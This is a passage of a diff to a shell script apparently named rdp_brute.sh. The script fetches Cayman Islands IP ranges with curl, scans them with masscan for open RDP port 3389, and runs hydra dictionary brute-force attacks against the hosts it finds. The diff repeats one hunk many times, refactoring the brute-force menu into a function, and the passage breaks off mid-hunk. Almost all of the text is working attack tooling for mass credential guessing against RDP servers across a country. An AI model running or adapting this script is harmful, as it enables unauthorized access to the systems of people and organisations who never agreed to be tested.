 curl http://ipdiapazon.16mb.com/Cayman_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -18481,6 +7534,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18490,53 +7544,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18554,6 +7562,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18563,53 +7572,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18627,6 +7590,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18636,53 +7600,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18700,6 +7618,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18709,53 +7628,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18773,6 +7646,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18782,53 +7656,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18846,6 +7674,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18855,53 +7684,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18919,6 +7702,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18928,53 +7712,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18992,6 +7730,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19001,53 +7740,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19065,6 +7758,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19074,53 +7768,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19138,6 +7786,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19147,53 +7796,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19211,6 +7814,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19220,53 +7824,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19284,6 +7842,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19293,53 +7852,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19357,6 +7870,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19366,53 +7880,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19430,6 +7898,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19439,53 +7908,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19503,6 +7926,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19512,53 +7936,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
